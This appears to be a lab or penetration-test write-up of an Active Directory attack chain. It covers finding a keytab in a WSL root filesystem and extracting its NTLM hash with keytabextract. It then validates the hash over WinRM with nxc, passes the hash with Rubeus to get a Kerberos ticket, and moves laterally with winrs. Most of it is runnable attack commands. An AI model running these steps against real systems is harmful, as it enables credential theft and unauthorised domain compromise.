```powershell
# FROM IT-EMPLOYEE15
winrs.exe -r:10.200.9.121 -u:".\Administrator" -p:'REDACTED_SECRET' cmd
```

## ENUMERATION

When standard tooling is unavailable or behaves unexpectedly — for example, WSL commands failing to execute — it is equally valid and often more effective to access underlying resources directly from the Windows filesystem.

#### Direct Access to Underlying Structures

```powershell
dir C:\Ubuntu\rootfs\root -Force
Get-ChildItem C:\Ubuntu\rootfs\root -Force | Sort-Object Length
```

#### WSL Invocation (if available)

```powershell
C:\Ubuntu\ubuntu.exe run "ls /"
# sqlsrv02.keytab
```

## ATTACK CHAIN

WSL was identified at `C:\Ubuntu\ubuntu.exe`, indicating a Linux subsystem running inside the Windows host. This expanded the search surface beyond the traditional Windows context and led to the discovery of the sensitive file `sqlsrv02.keytab`.

## EXPLOITATION

```
LOCAL ENUMERATION
↓
WSL DISCOVERY
↓
SENSITIVE FILE DISCOVERY (keytab)
↓
CREDENTIAL EXTRACTION
↓
KERBEROS AUTHENTICATION
↓
LATERAL MOVEMENT
```

> The keytab file was downloaded to the attack host for offline analysis.

#### 1. Credential Extraction from Keytab

```powershell
# Download sqlsrv02.keytab to the attack host and extract credentials
./keytabextract.py sqlsrv02.keytab 
#	REALM : it.gcb.example
#	SERVICE PRINCIPAL : sqlsvc/
#	NTLM HASH : REDACTED_SECRET
```

This reveals the NTLM hash of the `sqlsvc` service account, likely used by a SQL Server service within the domain.

> Keytab files can contain Kerberos keys associated with service accounts, which can be used for domain authentication without knowing the cleartext password.

#### 2. Target Identification

Although no directly exploitable ACLs were identified for `sqlsvc`, the account name implies association with SQL infrastructure. This type of service account is typically present on database servers, application servers, or reporting backends.

```powershell
Get-DomainObject -LDAPFilter "(objectClass=computer)" -Properties name -Domain ($env:USERDNSDOMAIN) | ? {$_.name -match "sql|db|data|report"} | select -Expand name

# IT-SQLSRV02
# it-db07
# it-sqlsrv06
# it-db02
# it-report02
# it-db11
# it-report07
# it-db04
# it-report04
....
```

#### 3. Access Validation via WinRM

The recovered NTLM hash is tested against identified SQL-related hosts using `nxc`.

```powershell
.\nxc.exe winrm .\hosts.txt -u sqlsvc -H REDACTED_SECRET -d it.gcb.example
# WINRM       10.200.9.51    5985   IT-SQLSRV02      [+] it.gcb.example\sqlsvc:REDACTED_SECRET (Pwn3d!)
```

> `(Pwn3d!)` confirms the account is valid and has WinRM access on `IT-SQLSRV02`.

#### 4. Kerberos Authentication (Pass-the-Hash)

```powershell
.\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.example /ntlm:REDACTED_SECRET /ptt
```

> Injects a Kerberos TGT into the current session.

#### 5. Lateral Movement

```powershell
winrs.exe -r:IT-SQLSRV02 cmd
```
